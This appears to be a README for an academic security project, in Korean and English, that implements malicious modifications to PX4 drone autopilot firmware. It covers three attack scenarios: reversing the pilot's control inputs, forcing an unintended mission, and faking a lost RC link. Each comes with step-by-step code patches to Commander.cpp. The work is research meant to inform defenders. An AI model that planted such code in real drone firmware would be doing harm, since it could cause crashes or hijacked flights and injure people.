# PX4-MalSW
## Development of Malicious Drone Software Using PX4 Autopilot
PX4-MalSW 프로젝트는 드론 공격 사례를 바탕으로 공격 시나리오를 체계화하고, PX4 Autopilot을 활용해 공격 시나리오에 해당하는 악성 소프트웨어를 구현함으로써, 서비스 개발자들에게 어떤 공격에 대비해야 하는지 방향을 제시하는 것을 목표로 한다.
- [2020 KSC 정보보안 및 고신뢰 컴퓨팅 우수 논문 선정](http://www.kiise.or.kr/academy/board/academyNewsView.fa?MENU_ID=080100&sch_add_bd=%ED%95%99%ED%9A%8C%EC%86%8C%EC%8B%9D&NUM=2127)

## PX4 Autopilot
![logo](https://user-images.githubusercontent.com/20378368/107306618-860e0000-6ac8-11eb-8c49-74e945c30e12.png)  
[PX4 autopilot](https://docs.px4.io/master/en/) is an [Open-Source](https://github.com/PX4/PX4-Autopilot) autopilot system for unmanned arial vehicle  
- [QGroundControl](http://qgroundcontrol.com/)
- [MAVLink Protocol](https://mavlink.io/en/)
- 2D/3D aerial maps
- Drag-and-drop waypoints

## PX4 Architecture
![arch](https://user-images.githubusercontent.com/20378368/107301110-21e63e80-6abe-11eb-9145-b88c1e9758a4.PNG)

## 3-Factor of Drone Attack
![3-factor](https://user-images.githubusercontent.com/20378368/107300818-940a5380-6abd-11eb-932b-fcd02a522b9f.png)
| Content | Description |
| --- | --- |
| Drone Aircraft | 드론 기기 내부의 상태 이상 |
| Ground Control Station | 드론의 외부, GCS 상태 이상 |
| Drone Flight Stack | 드론 비행 과정에서 동적 요소에 의한 상태 이상 |

## Let's Hack a Drone
### Scenario #1: Generating Control Error
- **데모 영상**: [YouTube Link](https://youtu.be/SOWdo8h1ZJA)
- **공격 유형**: Drone Aircraft, Drone Flight Stack
- **공격 지점**: Drone Firmware, Commander.cpp
- **공격 방법**:  
![image](https://user-images.githubusercontent.com/20378368/107301836-9a99ca80-6abf-11eb-9f4d-377eb12872bd.png)  
```
Step 1: 새로운 Data가 Publish 됐는지 확인
if(last_setpoint_x != (int)(_manual_control_setpoint.x * 10000) && last_setpoint_y != (int)(_manual_control_setpoint.y *10000))
```
```
Step 2: 새로운 Setpoint 선언 & orb_copy를 이용해 복사
struct manual_control_setpoint_s temp_setpoint;
orb_copy(ORB_ID(manual_control_setpoint), 1, &temp_setpoint);
```
```
Step 3: 새로운 Setpoint 값에 x, y의 반대 방향으로 업데이트
temp_setpoint = _manual_control_setpoint;
temp_setpoint.x *= (-1);
temp_setpoint.y *= (-1);
```
```
Step 4: 업데이트된 Setpoint 값 Publish
orb_advert_t changed_setpoint = orb_advertise(ORB_ID(manual_control_setpoint), &temp_setpoint);
orb_publish(ORB_ID(manual_control_setpoint), changed_setpoint, &temp_setpoint);
```
```
Step 5: 현재 Setpoint 값을 last_setpoint에 저장
last_setpoint_x = (int)(temp_setpoint.x * 10000);
last_setpoint_y = (int)(temp_setpoint.y * 10000);
```
### Scenario #2: Unintended Mission Conduct
- **데모 영상**: [YouTube Link](https://youtu.be/edIfXTZRIV8)
- **공격 유형**: Drone Aircraft, Ground Control Station, Drone Flight Stack
- **공격 지점**: Drone Firmware, Commander.cpp
- **공격 방법**:  
![image](https://user-images.githubusercontent.com/20378368/107302293-82767b00-6ac0-11eb-91d9-1a7af3b3755f.png)
```
Step 1: Mission 구조체 선언
mission_s mission;
```
```
Step 2: Dataman의 Data(Mission, Setpoint) 읽은 결과를 새로 선언한 Mission에 업데이트
if (dm_read(DM_KEY_MISSION_STATE, 0, &mission, sizeof(mission_s)) == sizeof(mission_s)) {
    if (mission.dataman_id == DM_KEY_WAYPOINTS_OFFBOARD_0 || mission.dataman_id == DM_KEY_WAYPOINTS_OFFBOARD_1) {
        if (mission.count > 0) {
            PX4_INFO("Mission #%d loaded, %u WPs, curr: %d", mission.dataman_id, mission.count, mission.current_seq);
        }
    }
}
```
```
Step 3: 업데이트된 Mission을 Publish
_mission_pub.publish(mission);
```
```
Step 4: Mission이 정상적으로 Publish 됐는지 확인
const bool mission_result_ok = (mission_result.timestamp > _boot_timestamp) 
    && (mission_result.instance_count > 0);
```
```
Step 5: Mission이 수행 가능한 상태인지 확인
if (status_flags.condition_home_position_valid &&
    (prev_mission_instance_count != mission_result.instance_count)) {

    if (!status_flags.condition_auto_mission_available) {
        // the mission is invalid
        tune_mission_fail(true);

    } else if (mission_result.warning) {
        // the mission has a warning
        tune_mission_fail(true);

    } else {
        // the mission is valid
        tune_mission_ok(true);
    }
}
```
```
Step 6: Mission 수행 모드로 전환 & Mission 수행됨
main_state_transition(status, commander_state_s::MAIN_STATE_AUTO_MISSION, status_flags, &_internal_state);
```
```
Step 7: Mission이 끝나면 MESL02_Mission_flag를 false로 Set
if(_mission_result_sub.get().finished){
  MESL02_Mission_flag = false;
}
```
### Scenario #3: RC Connection Lost
- **데모 영상**: [YouTube Link](https://youtu.be/DLxIkqdxU0k)
- **공격 유형**: Ground Control Station, Drone Flight Stack
- **공격 지점**: Drone Firmware, Commander.cpp
- **공격 방법**:  
![image](https://user-images.githubusercontent.com/20378368/107302870-645d4a80-6ac1-11eb-93f8-88b8ca5c313b.png)
```
Step 1: 1000번의 Loss Signal을 보냄
else if(MESL03_Loss_flag <= 1000)
```
```
Step 2: Status 구조체의 rc_signal_lost를 true로 전환
status.rc_signal_lost = true;
```
```
Step 3: set_health_flags() 함수를 이용해 업데이트된 Status로 flag 설정
set_health_flags(subsystem_info_s::SUBSYSTEM_TYPE_RCRECEIVER, true, true, false, status);
_status_changed = true;
```